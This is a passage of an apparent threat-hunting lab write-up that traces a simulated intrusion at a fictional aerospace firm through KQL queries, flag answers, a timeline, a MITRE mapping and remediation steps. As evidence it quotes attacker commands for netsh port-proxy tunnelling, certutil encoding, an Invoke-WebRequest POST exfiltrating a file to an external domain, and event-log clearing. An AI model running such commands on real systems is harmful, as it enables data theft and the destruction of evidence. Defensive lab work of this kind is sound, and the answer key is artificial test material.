Identify unauthorised network configuration changes on the beachhead that could enable persistent covert access channels.

**What to Hunt:**
Look for `netsh.exe` executions on `WS-ENG04` — specifically `portproxy` commands that redirect network traffic between ports and hosts.

![[Pasted image 20260515181352.png]]

At **2026-02-28 03:25:27**, `HALDRIC\s.brandt` executed `netsh.exe` on `WS-ENG04` via `cmd.exe`:

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
```

This command creates a port forwarding rule: any TCP connection arriving on port `8443` on `WS-ENG04` is transparently forwarded to `SRV-DC01` on port `445` (SMB). This establishes a **covert tunnel** — the adversary can reach the Domain Controller's SMB service through the beachhead without directly connecting to it, bypassing network controls that might block direct external access to DC ports.

---

### ✅ Q22 Answer: `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local`

---

<a id="q23---configuration-storage"></a>
# 🚩 Q23 — Configuration Storage

**Objective:**
Confirm whether the port proxy configuration survives a system reboot by identifying where it is stored in the registry.

**What to Hunt:**
Query `DeviceRegistryEvents` on `WS-ENG04` filtered to `netsh.exe` as the initiating process to find the registry key written by the portproxy command.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceRegistryEvents"
| where DeviceName == "WS-ENG04"
| where InitiatingProcessFileName == "netsh.exe"
| sort by EventTime asc
```

![[Pasted image 20260515182347.png]]

The `netsh interface portproxy` command automatically persists its configuration to the Windows registry under:

```
HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp
```

This key survives system reboots. The port forwarding rule will be re-applied automatically each time Windows starts, giving the adversary **persistent network tunnel infrastructure** that does not require re-execution. A simple credential reset would not remove this persistence mechanism.

---

### ✅ Q23 Answer: `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

---

<a id="q24---matching-configuration-on-dc"></a>
# 🚩 Q24 — Matching Configuration on DC

**Objective:**
Determine whether the same port proxy tunneling technique was replicated on the Domain Controller.

**What to Hunt:**
Query `DeviceProcessEvents` on `SRV-DC01` for `netsh.exe` executions.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where FileName == "netsh.exe"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515182924.png]]

At **2026-02-28 04:23:14**, `HALDRIC\m.richter` executed `netsh.exe` on `SRV-DC01` via `cmd.exe`:

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp
```

This mirrors the beachhead configuration — but in reverse direction, forwarding traffic received on port `9999` back to `WS-ENG04` (`10.1.36.210`) on port `8443`. Together with the beachhead rule, this creates a **bidirectional tunnel chain** between the adversary's external infrastructure, through `WS-ENG04`, and into `SRV-DC01` — a multi-hop covert communication channel that survives reboots on both hosts.

---

### ✅ Q24 Answer: `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp`

---

<a id="q25---targeted-directory"></a>
# 🚩 Q25 — Targeted Directory

**Objective:**
Identify which specific directory on the file server the adversary targeted for data collection — the intellectual property at the heart of the intrusion.

**What to Hunt:**
Query `DeviceProcessEvents` on `SRV-FILES02` for PowerShell compression commands — the final staging step before exfiltration.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-FILES02"
| where FileName == "powershell.exe"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515183704.png]]

At **2026-02-28 03:18:59**, `HALDRIC\m.richter` executed on `SRV-FILES02` via `cmd.exe`:

```
powershell  Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force
```

The targeted directory — `C:\Engineering\Avionics\A400M_NavSys` — contains avionics navigation system data for the **A400M military transport aircraft**. This is classified programme data directly relevant to a European defence programme. The directory path confirms the adversary had prior knowledge of the file server structure and went directly to the highest-value intellectual property without broad exploration.

---

### ✅ Q25 Answer: `C:\Engineering\Avionics\A400M_NavSys`

---

<a id="q26---packaged-output"></a>
# 🚩 Q26 — Packaged Output

**Objective:**
Identify the filename used to package the stolen avionics data.

The `Compress-Archive` command in Q25 specified the destination path explicitly:

```
-DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip'
```

The filename `win_update_kb5034.zip` masquerades as a Windows Update package — the KB number format (`kb5034`) is designed to blend with legitimate Microsoft update nomenclature and avoid raising suspicion during casual review of the `C:\Windows\Temp` directory.

---

### ✅ Q26 Answer: `win_update_kb5034.zip`

---

<a id="q27---compression-method"></a>
# 🚩 Q27 — Compression Method

**Objective:**
Identify the specific PowerShell cmdlet used to compress the stolen data.

The compression command identified in Q25 used the native PowerShell cmdlet `Compress-Archive` — built into Windows PowerShell 5.0+. No third-party tools were required, consistent with GREY VEIL's documented preference for living-off-the-land techniques that leave no unusual tool installations.

---

### ✅ Q27 Answer: `Compress-Archive`

---

<a id="q28---format-conversion"></a>
# 🚩 Q28 — Format Conversion

**Objective:**
Identify the tool used to convert the compressed archive into a format suitable for covert exfiltration.

![[Pasted image 20260515184656.png]]

At **2026-02-28 03:19:37** — 38 seconds after the compression — `HALDRIC\m.richter` executed on `SRV-FILES02`:

```
certutil  -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64
```

`certutil.exe` is a legitimate Windows certificate management utility that can encode arbitrary binary files to Base64. The `-encode` flag converts the ZIP archive to a text-based Base64 file (`win_update_kb5034.b64`). Base64 encoding can help bypass content-inspection controls that block binary file uploads. `certutil` is a signed Microsoft binary — its use generates no malware alerts.

---

### ✅ Q28 Answer: `certutil`

---

<a id="q29---outbound-transfer"></a>
# 🚩 Q29 — Outbound Transfer

**Objective:**
Identify the command used to exfiltrate the staged data outside the Haldric Aerospace network.

**What to Hunt:**
Search `DeviceProcessEvents` for PowerShell web request commands involving the encoded file.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine contains "win_update_kb5034.b64"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515185246.png]]

At **2026-03-02 01:19:15**, `HALDRIC\s.brandt` executed on `WS-ENG04` via `cmd.exe`:

```
powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing
```

The exfiltration used `Invoke-WebRequest` — a native PowerShell cmdlet — to HTTP POST the encoded archive to an external domain. The domain `cdn-telemetry.cloud-endpoint.net` is designed to blend with legitimate Content Delivery Network (CDN) or telemetry infrastructure. The 2-day gap between the data staging on Feb 28 and the exfiltration on Mar 2 reflects deliberate operational pacing — the adversary waited before sending data out.

---

### ✅ Q29 Answer: `powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`

---

<a id="q30---external-destination"></a>
# 🚩 Q30 — External Destination

**Objective:**
Identify the external domain used as the exfiltration endpoint.

The exfiltration command in Q29 specifies the destination URI explicitly:

```
https://cdn-telemetry.cloud-endpoint.net
```

The domain `cdn-telemetry.cloud-endpoint.net` is adversary-controlled infrastructure masquerading as a legitimate CDN/telemetry service. The naming convention (`cdn`, `telemetry`) is chosen to blend with common enterprise outbound traffic patterns and avoid triggering domain-based detection rules.

---

### ✅ Q30 Answer: `cdn-telemetry.cloud-endpoint.net`

---

<a id="q31---reentry-window"></a>
# 🚩 Q31 — Reentry Window

**Objective:**
Determine how long the adversary waited before returning to the beachhead after the exfiltration date.

**What to Hunt:**
Find the first `s.brandt` activity on `WS-ENG04` after the exfiltration timestamp of 2026-03-02 01:19:15.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where todatetime(EventTime) > datetime(2026-03-02T01:19:15Z)
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
| take 5
```

The adversary exfiltrated data on **2026-03-02** and next appeared on the beachhead on **2026-03-04** — a gap of **2 days**. This deliberate cooling-off period between exfiltration and re-entry is consistent with GREY VEIL's documented pattern of operational patience, reducing the risk of detection during or immediately after the most visible action (data transfer).

---

### ✅ Q31 Answer: `2`

---

<a id="q32---first-cleanup-action"></a>
# 🚩 Q32 — First Cleanup Action

**Objective:**
Identify the earliest anti-forensics action taken across all three compromised hosts.

**What to Hunt:**
Search all hosts for `wevtutil` log-clearing commands, sorted chronologically to find which host had logs cleared first.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where InitiatingProcessFileName != "splunkd.exe"
| where ProcessCommandLine has_any ("wevtutil", "Clear-EventLog", "cl Security", "cl System", "cl Application")
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515191508.png]]

The earliest log-clearing action across all hosts occurred at **2026-02-23 11:01:19** on `WS-ENG04`, executed by `HALDRIC\s.brandt` via `cmd.exe`:

```
wevtutil  cl Security
```

Notably, this occurred **5 days before the lateral movement to SRV-DC01 and SRV-FILES02** — the adversary was already performing cleanup on the beachhead during the reconnaissance phase, clearing evidence of their discovery activity as they went.

---

### ✅ Q32 Answer: `wevtutil  cl Security`

---

<a id="q33---clearing-method-analysis"></a>
# 🚩 Q33 — Clearing Method Analysis

**Objective:**
Determine which hosts had logs cleared directly from the console versus cleared remotely via WMI.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine contains "wevtutil cl Security"
| where InitiatingProcessFileName != "splunkd.exe"
| project EventTime, DeviceName, InitiatingProcessFileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515193237.png]]

Analysis of the log-clearing events across all three hosts reveals a clear split in execution method:

| Host | Initiating Process | Method | Time |
|------|--------------------|--------|------|
| WS-ENG04 | `cmd.exe` | **Direct/console** — attacker typed it locally | 2026-02-23 11:01:19 |
| SRV-FILES02 | `WmiPrvSE.exe` | **Remote via WMI** — triggered from WS-ENG04 | 2026-02-28 03:33:51 |
| SRV-DC01 | `WmiPrvSE.exe` | **Remote via WMI** — triggered from WS-ENG04 | 2026-02-28 04:46:24 |

The beachhead was cleaned interactively; the two lateral movement targets were cleaned remotely — the adversary never needed to log into them directly to destroy evidence.

---

### ✅ Q33 Answer: `WS-ENG04/SRV-DC01, SRV-FILES02`

---

<a id="q34---surviving-log-source"></a>
# 🚩 Q34 — Surviving Log Source

**Objective:**
Identify the log source that survived the adversary's cleanup and provided the telemetry for this entire investigation.

Despite clearing Windows Security, System, Application, and PowerShell event logs on all three hosts, the adversary failed to account for **Sysmon** — the System Monitor service from Sysinternals (now part of Windows). Sysmon operates independently from the Windows Event Log service and forwards its telemetry directly to Microsoft Sentinel via the Log Analytics agent, bypassing the local Windows Event Log infrastructure entirely. `wevtutil cl` has no effect on Sysmon telemetry already forwarded to the SIEM.

This is why 8,538 events remained available in `SilentCorridorX_CL` — the adversary's cleanup destroyed local logs but could not reach data already ingested by the cloud-based SIEM. Without Sysmon forwarding to Sentinel, this hunt would have had no telemetry to work with.

---

### ✅ Q34 Answer: `Sysmon`

---

<a id="q35---exfiltration-confidence-call"></a>
# 🚩 Q35 — Exfiltration Confidence Call

**Objective:**
Provide a confidence rating on whether sensitive data was successfully exfiltrated, supported by evidence.

Three independent evidence chains confirm successful exfiltration:

1. **Data staging confirmed** — `Compress-Archive` created `win_update_kb5034.zip` from `C:\Engineering\Avionics\A400M_NavSys` on `SRV-FILES02` at 03:18:59 on 2026-02-28, followed 38 seconds later by `certutil -encode` converting it to `win_update_kb5034.b64`

2. **Exfiltration command executed** — `Invoke-WebRequest -Method POST -InFile win_update_kb5034.b64` was executed on `WS-ENG04` at 01:19:15 on 2026-03-02, targeting `cdn-telemetry.cloud-endpoint.net` — an adversary-controlled external domain with no legitimate business relationship to Haldric Aerospace

3. **No evidence of failure** — There are no network error events, no connection-refused logs, and no retry loops in the data suggesting the POST request failed. The adversary's subsequent clean-up operations proceeded systematically, consistent with a successful mission

---

### ✅ Q35 Answer: `HIGH. The adversary staged sensitive avionics data from C:\Engineering\Avionics\A400M_NavSys, compressed it into win_update_kb5034.zip using Compress-Archive, encoded it to Base64 via certutil.exe producing win_update_kb5034.b64, and exfiltrated it externally using PowerShell Invoke-WebRequest to cdn-telemetry.cloud-endpoint.net.`

---

<a id="q36---dc-staging-cleanup"></a>
# 🚩 Q36 — DC Staging Cleanup

**Objective:**
Identify the command used to remove the credential dumping staging directory from the Domain Controller.

**What to Hunt:**
Search `DeviceProcessEvents` on `SRV-DC01` for `rmdir` commands targeting the `McAfee_Logs` staging directory.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine contains "rmdir"
| where InitiatingProcessFileName != "splunkd.exe"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, InitiatingProcessFileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515200537.png]]

At **2026-02-28 04:45:49**, `HALDRIC\m.richter` executed on `SRV-DC01` via `WmiPrvSE.exe` (remotely triggered from `WS-ENG04`):

```
cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs
```

The `/s` flag removes the directory and all its contents recursively; `/q` suppresses confirmation prompts. This single command deleted the `ntds.dit` file, any associated VSS artefacts, and the `McAfee_Logs` staging directory itself — eliminating all credential dumping evidence from the Domain Controller in a single automated remote command.

---

### ✅ Q36 Answer: `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`

---

<a id="q37---ciso-brief"></a>
# 🚩 Q37 — CISO Brief

**Objective:**
Provide an executive brief for CISO K. Hofmann covering: both compromised accounts, the compromised hosts, the targeted data and exfiltration method, the persistence mechanism, and one immediate containment action.

---

> **CISO Brief — Operation Silent Corridor // For: K. Hofmann // RESTRICTED**
>
> Two accounts are confirmed compromised: `s.brandt` (used for initial VPN access, beachhead operations, and exfiltration) and `m.richter` (credentials stolen and used for lateral movement across all three hosts). Three hosts are fully compromised: `WS-ENG04` (adversary beachhead), `SRV-DC01` (Domain Controller — NTDS.dit exfiltrated), and `SRV-FILES02` (engineering file server — A400M avionics data exfiltrated). The adversary targeted `C:\Engineering\Avionics\A400M_NavSys`, compressed and Base64-encoded it using native Windows tools, and exfiltrated it via PowerShell HTTPS POST to adversary-controlled infrastructure at `cdn-telemetry.cloud-endpoint.net`. Persistence survives credential resets via netsh portproxy registry keys (`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`) configured on both `WS-ENG04` and `SRV-DC01`, maintaining a covert bidirectional tunnel that re-activates on every reboot. Immediate containment: isolate `WS-ENG04`, `SRV-DC01`, and `SRV-FILES02` from the network now, remove all portproxy configurations from both hosts, and treat all HALDRIC domain credentials as compromised pending a full domain password reset.

---

### ✅ Q37 Answer: See brief above.

---

<a id="conclusion-investigation-timeline--key-findings"></a>
# 📊 Conclusion, Investigation Timeline & Key Findings

## Conclusion

The proactive hunt confirmed that **GREY VEIL has fully compromised the Haldric Aerospace engineering segment**. The adversary operated with extended dwell — entering on 2026-02-20 and maintaining undetected access through 2026-03-05 — consistent with all previously documented GREY VEIL campaigns. No endpoint alerts fired during the entire intrusion lifecycle. Traditional detection failed completely.

The adversary used exclusively native Windows tooling: `WMIC.exe`, `certutil.exe`, `netsh.exe`, `vssadmin.exe`, `Compress-Archive`, `Invoke-WebRequest`, `reg.exe`, `wevtutil.exe`. No malware was deployed. No signatures were available to fire.

The A400M avionics navigation system data — classified programme material — is assessed with **HIGH confidence** to have been exfiltrated to adversary-controlled infrastructure.

---

## Investigation Timeline

| Time (UTC) | Event | Host | Account |
|------------|-------|------|---------|
| 2026-02-19 23:47:12 | VPN login failure — credential stuffing begins | FortiGate | s.brandt |
| 2026-02-20 02:14:00 | First successful VPN login; `systeminfo.exe` executed | WS-ENG04 | s.brandt |
| 2026-02-23 01:47:xx | AD group enumeration: Domain Admins, Enterprise Admins | WS-ENG04 | s.brandt |
| 2026-02-23 11:01:19 | **First cleanup action**: `wevtutil cl Security` | WS-ENG04 | s.brandt |
| 2026-02-26 02:38:49 | `tasklist /fi "imagename eq lsass.exe"` — LSASS enumeration | WS-ENG04 | s.brandt |
| 2026-02-26 02:40:03 | LSASS dump attempt via `comsvcs.dll MiniDump` — failed | WS-ENG04 | s.brandt |
| 2026-02-27 11:04:16 | `cmdkey /list` — Credential Manager enumeration | WS-ENG04 | s.brandt |
| 2026-02-27 12:20:20 | `reg save HKLM\SAM` — SAM hive export (×2) | WS-ENG04 | s.brandt |
| 2026-02-28 03:15:36 | First lateral pivot: WMIC to SRV-DC01 as m.richter | WS-ENG04 | s.brandt |
| 2026-02-28 03:16:53 | `mkdir C:\Windows\Temp\McAfee_Logs` on SRV-DC01 | SRV-DC01 | m.richter |
| 2026-02-28 03:18:59 | `Compress-Archive A400M_NavSys → win_update_kb5034.zip` | SRV-FILES02 | m.richter |
| 2026-02-28 03:19:37 | `certutil -encode → win_update_kb5034.b64` | SRV-FILES02 | m.richter |
| 2026-02-28 03:25:27 | Port proxy configured: WS-ENG04 → SRV-DC01:445 | WS-ENG04 | s.brandt |
| 2026-02-28 03:33:51 | `wevtutil cl Security` on SRV-FILES02 (remote via WMI) | SRV-FILES02 | m.richter |
| 2026-02-28 04:20:00 | `vssadmin create shadow /for=C:` on SRV-DC01 | SRV-DC01 | m.richter |
| 2026-02-28 04:21:13 | `ntds.dit` created in `McAfee_Logs` staging directory | SRV-DC01 | m.richter |
| 2026-02-28 04:21:52 | `MsMpEng.exe` accesses `ntds.dit` — no remediation | SRV-DC01 | SYSTEM |
| 2026-02-28 04:23:14 | Port proxy configured: SRV-DC01 → WS-ENG04:8443 | SRV-DC01 | m.richter |
| 2026-02-28 04:45:49 | `rmdir /s /q McAfee_Logs` — staging cleanup | SRV-DC01 | m.richter |
| 2026-02-28 04:46:24 | `wevtutil cl Security` on SRV-DC01 (remote via WMI) | SRV-DC01 | m.richter |
| 2026-03-02 01:19:15 | `Invoke-WebRequest POST → cdn-telemetry.cloud-endpoint.net` | WS-ENG04 | s.brandt |
| 2026-03-04 xx:xx:xx | Adversary re-enters beachhead (2-day reentry window) | WS-ENG04 | s.brandt |

---

## Key Findings

|#|Flag|Objective|Key Finding|Answer|
|---|---|---|---|---|
|0|Q00|Environment Access|Sentinel custom log table name|`SilentCorridorX_CL`|
|1|Q01|Suspicious Account|Queried DeviceLogonEvents for NTLM logins from device named `kali`. Account `s.brandt` appeared across all compromised hosts.|`s.brandt`|
|2|Q02|Failed Auth Origin|FortiGate VPN showed ssl-login-fail from `185.220.101.34` at 23:47, followed by successful login from same IP at 02:14.|`185.220.101.34`|
|3|Q03|Connection Footprint|Four unique source IPs used by s.brandt across the hunt window — three confirmed anonymisation infrastructure.|`4`|
|4|Q04|Source Address Inventory|Sorted by first octet: Tor exit node, residential, two anonymisation services.|`45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34`|
|5|Q05|Landing Point|All attacker VPN sessions terminated at `WS-ENG04` with TunnelIP `10.1.96.114`.|`WS-ENG04`|
|6|Q06|Initial Process|First process at 02:14 = `systeminfo.exe` spawned by `cmd.exe` — immediate host survey.|`systeminfo.exe/cmd.exe`|
|7|Q07|Directory Enumeration|Two sequential `net group /dom` commands mapping high-privilege AD accounts.|`Domain Admins, Enterprise Admins`|
|8|Q08|Network Recon|WMIC.exe connections to `10.1.31.206` (SRV-DC01) and `10.1.70.42` (SRV-FILES02).|`SRV-DC01, SRV-FILES02`|
|9|Q09|First Credential Activity|`tasklist /fi "imagename eq lsass.exe"` at 02:38:49 — LSASS PID enumeration before dump.|`tasklist /fi "imagename eq lsass.exe"`|
|10|Q10|Dump Outcome|`comsvcs.dll MiniDump` attempt at 02:40:03 — no output file created in DeviceFileEvents.|`NO/none`|
|11|Q11|Credential Source|`reg save HKLM\SAM C:\Windows\Temp\sam.bak` executed twice on 2026-02-27.|`SAM`|
|12|Q12|Saved Credentials|`cmdkey /list` enumerates Windows Credential Manager stored passwords.|`cmdkey /list`|
|13|Q13|First Lateral Pivot|WMIC to SRV-DC01 using stolen m.richter credentials; tunnel `10.1.96.114` active at that time.|`10.1.96.114/SRV-DC01/m.richter`|
|14|Q14|New Account|WMIC command contained plaintext credentials for `m.richter` — confirming credential theft success.|`m.richter`|
|15|Q15|Cross-Host Spawning|All commands on SRV-DC01 initiated via WMIC from WS-ENG04.|`WMIC.exe`|
|16|Q16|Filesystem Activity|`mkdir C:\Windows\Temp\McAfee_Logs` — staging dir masquerading as AV logs.|`C:\Windows\Temp\McAfee_Logs`|
|17|Q17|Critical File|`ntds.dit` created at 04:21:13 under m.richter — full AD credential database.|`ntds.dit/m.richter`|
|18|Q18|Concurrent Access|`MsMpEng.exe` accessed ntds.dit 39 seconds after creation — no remediation action.|`MsMpEng.exe`|
|19|Q19|DB File Access|`vssadmin create shadow /for=C:` bypassed OS file lock on live ntds.dit.|`vssadmin.exe`|
|20|Q20|Spawning Source|All SRV-DC01 commands have parent `WmiPrvSE.exe`; origin host = WS-ENG04.|`WmiPrvSE.exe/WS-ENG04`|
|21|Q21|RDP Scope|Tunnel IP `10.1.96.114` connected to WS-ENG04, SRV-DC01, and SRV-FILES02.|`SRV-DC01, SRV-FILES02, WS-ENG04`|
|22|Q22|Network Config Change|`netsh portproxy add` forwarding port 8443 → SRV-DC01:445 (SMB tunnel).|`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local`|
|23|Q23|Config Storage|portproxy persists in `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`.|`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`|
|24|Q24|DC Config|Mirror portproxy on SRV-DC01: port 9999 → WS-ENG04:8443 — bidirectional tunnel.|`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp`|
|25|Q25|Targeted Directory|`C:\Engineering\Avionics\A400M_NavSys` — classified A400M military avionics data.|`C:\Engineering\Avionics\A400M_NavSys`|
|26|Q26|Packaged Output|Archive named `win_update_kb5034.zip` — disguised as Windows Update package.|`win_update_kb5034.zip`|
|27|Q27|Compression Method|`Compress-Archive` PowerShell cmdlet — native, no third-party tools.|`Compress-Archive`|
|28|Q28|Format Conversion|`certutil -encode` converts binary ZIP to Base64 for exfiltration.|`certutil`|
|29|Q29|Outbound Transfer|`Invoke-WebRequest POST` to `cdn-telemetry.cloud-endpoint.net` — native PowerShell.|`powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`|
|30|Q30|External Destination|C2/exfil domain: `cdn-telemetry.cloud-endpoint.net`.|`cdn-telemetry.cloud-endpoint.net`|
|31|Q31|Reentry Window|Exfil on Mar 2; next s.brandt activity on Mar 4 — 2-day cooling period.|`2`|
|32|Q32|First Cleanup|Earliest log clear: `wevtutil cl Security` on WS-ENG04 at 2026-02-23 11:01:19.|`wevtutil cl Security`|
|33|Q33|Clearing Method|WS-ENG04 cleared directly (console); SRV-DC01 and SRV-FILES02 cleared remotely (WMI).|`WS-ENG04/SRV-DC01, SRV-FILES02`|
|34|Q34|Surviving Log|Sysmon telemetry forwarded to Sentinel — unaffected by local `wevtutil` clearing.|`Sysmon`|
|35|Q35|Exfil Confidence|HIGH — staging, encoding, and POST transfer all confirmed in telemetry.|`HIGH`|
|36|Q36|DC Cleanup|`cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` — deletes all ntds.dit artefacts.|`cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`|
|37|Q37|CISO Brief|Full executive summary delivered — see Q37 section above.|See Q37|

---

<a id="mitre-attck-mapping"></a>
# 🛡️ MITRE ATT&CK Mapping

| ID | Tactic | Technique | ID | Evidence |
|----|--------|-----------|----|----------|
| 1 | Initial Access (TA0001) | Valid Accounts: Domain Accounts | T1078.002 | s.brandt credentials used via SSL VPN after failed auth from 185.220.101.34 |
| 2 | Initial Access (TA0001) | External Remote Services | T1133 | FortiGate SSL VPN used as initial access vector |
| 3 | Discovery (TA0007) | System Information Discovery | T1082 | `systeminfo.exe` executed at first attacker session |
| 4 | Discovery (TA0007) | Domain Groups | T1069.002 | `net group "Domain Admins" /dom`, `net group "Enterprise Admins" /dom` |
| 5 | Discovery (TA0007) | Network Share Discovery | T1135 | WMIC.exe network connections mapping SRV-DC01 and SRV-FILES02 |
| 6 | Credential Access (TA0006) | OS Credential Dumping: LSASS Memory | T1003.001 | `tasklist /fi lsass.exe` + `comsvcs.dll MiniDump` attempt |
| 7 | Credential Access (TA0006) | OS Credential Dumping: Security Account Manager | T1003.002 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` |
| 8 | Credential Access (TA0006) | OS Credential Dumping: NTDS | T1003.003 | `vssadmin create shadow` + ntds.dit copied to McAfee_Logs |
| 9 | Credential Access (TA0006) | Credentials from Password Stores | T1555 | `cmdkey /list` enumerates Windows Credential Manager |
| 10 | Lateral Movement (TA0008) | Windows Management Instrumentation | T1047 | WMIC.exe used to remotely execute commands on SRV-DC01 and SRV-FILES02 |
| 11 | Lateral Movement (TA0008) | Remote Services: Remote Desktop Protocol | T1021.001 | RDP activity observed from tunnel IP 10.1.96.114 to target hosts |
| 12 | Collection (TA0009) | Data from Local System | T1005 | `C:\Engineering\Avionics\A400M_NavSys` targeted on SRV-FILES02 |
| 13 | Collection (TA0009) | Archive Collected Data: Archive via Utility | T1560.001 | `Compress-Archive` compresses A400M avionics data |
| 14 | Collection (TA0009) | Data Staged: Local Data Staging | T1074.001 | `C:\Windows\Temp\McAfee_Logs` and `C:\Windows\Temp\win_update_kb5034.*` |
| 15 | Defense Evasion (TA0005) | Masquerading | T1036 | `McAfee_Logs` directory name; `win_update_kb5034.zip` KB number format |
| 16 | Defense Evasion (TA0005) | Indirect Command Execution | T1202 | `certutil -encode` used as LOLBin for Base64 encoding |
| 17 | Defense Evasion (TA0005) | Indicator Removal: Clear Windows Event Logs | T1070.001 | `wevtutil cl Security` across WS-ENG04, SRV-DC01, SRV-FILES02 |
| 18 | Persistence (TA0003) | Traffic Signaling: Port Knocking | T1572 | `netsh portproxy` creates persistent bidirectional tunnel (8443↔445) |
| 19 | Command & Control (TA0011) | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS POST to cdn-telemetry.cloud-endpoint.net |
| 20 | Exfiltration (TA0010) | Exfiltration Over Web Service | T1567 | `Invoke-WebRequest POST` uploads win_update_kb5034.b64 to external domain |

---

<a id="remediation"></a>
# 🛠️ Remediation

- **Isolate all three compromised hosts** — disconnect `WS-ENG04`, `SRV-DC01`, and `SRV-FILES02` from the network immediately to prevent ongoing C2 activity and further data exfiltration
- **Block external infrastructure** — blacklist `cdn-telemetry.cloud-endpoint.net` and the attacker IPs (`185.220.101.34`, `91.234.33.126`, `45.153.160.88`) at the perimeter firewall
- **Remove portproxy configurations** — delete the portproxy registry keys from both `WS-ENG04` and `SRV-DC01`: `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`. These survive credential resets.
- **Treat all domain credentials as compromised** — the adversary obtained `ntds.dit` (all domain hashes) and explicit plaintext credentials for `m.richter`. Initiate a full domain password reset across all HALDRIC accounts.
- **Reset s.brandt and m.richter accounts** — disable immediately pending investigation of any other accounts those credentials may have accessed
- **Notify programme security officers** — the A400M avionics navigation system data has been exfiltrated to an external adversary. This is a programme security incident requiring notification per applicable defence contractor obligations.
- **Enforce MFA on VPN** — the initial compromise was a simple credential theft against a VPN with no second factor. Enforce MFA for all VPN authentication immediately.
